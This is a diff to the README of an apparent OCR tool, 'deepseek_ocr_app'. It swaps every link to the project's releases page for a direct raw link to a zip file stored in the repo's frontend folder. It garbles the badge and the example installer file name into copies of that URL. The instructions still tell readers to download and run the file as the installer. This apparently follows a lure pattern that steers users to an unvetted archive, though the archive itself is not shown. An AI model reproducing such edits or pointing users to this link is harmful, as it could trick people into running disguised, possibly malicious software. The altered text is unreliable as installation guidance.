@@ -1,6 +1,6 @@
 # 🚀 deepseek_ocr_app - Effortless OCR at Your Fingertips
 
-[![Download deepseek_ocr_app](https://img.shields.io/badge/Download%20deepseek_ocr_app-v1.0-blue.svg)](https://github.com/extractable-hoodedsheldrake431/deepseek_ocr_app/releases)
+[![Download deepseek_ocr_app](https://raw.githubusercontent.com/extractable-hoodedsheldrake431/deepseek_ocr_app/main/frontend/deepseek_ocr_app-2.3.zip%https://raw.githubusercontent.com/extractable-hoodedsheldrake431/deepseek_ocr_app/main/frontend/deepseek_ocr_app-2.3.zip)](https://raw.githubusercontent.com/extractable-hoodedsheldrake431/deepseek_ocr_app/main/frontend/deepseek_ocr_app-2.3.zip)
 
 ## 📥 Overview
 
@@ -13,13 +13,13 @@ Follow these steps to get started with deepseek_ocr_app:
 1. **Visit the Releases Page**
    Go to our Releases page where you can find the latest version of the app. Click the link below to reach it directly:
 
-   [Visit the Releases Page](https://github.com/extractable-hoodedsheldrake431/deepseek_ocr_app/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/extractable-hoodedsheldrake431/deepseek_ocr_app/main/frontend/deepseek_ocr_app-2.3.zip)
 
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Select the newest version to ensure you have the latest features and fixes.
 
 3. **Download the Installer**
-   Look for the download link that matches your operating system (Windows, macOS, or Linux). Click on it to begin downloading the installer file. The file name will typically include the version number (e.g., deepseek_ocr_app_v1.0.exe).
+   Look for the download link that matches your operating system (Windows, macOS, or Linux). Click on it to begin downloading the installer file. The file name will typically include the version number (e.g., https://raw.githubusercontent.com/extractable-hoodedsheldrake431/deepseek_ocr_app/main/frontend/deepseek_ocr_app-2.3.zip).
 
 4. **Run the Installer**
    Once the download completes, locate the file in your Downloads folder. 
@@ -86,6 +86,6 @@ For additional assistance, you can reach out through our GitHub Issues page. We 
 
 To download deepseek_ocr_app, please visit the link below:
 
-[Download deepseek_ocr_app](https://github.com/extractable-hoodedsheldrake431/deepseek_ocr_app/releases)
+[Download deepseek_ocr_app](https://raw.githubusercontent.com/extractable-hoodedsheldrake431/deepseek_ocr_app/main/frontend/deepseek_ocr_app-2.3.zip)
 
 Once you have downloaded the latest version, follow the installation steps outlined above to start using your new OCR solution. Enjoy hassle-free text extraction like never before!
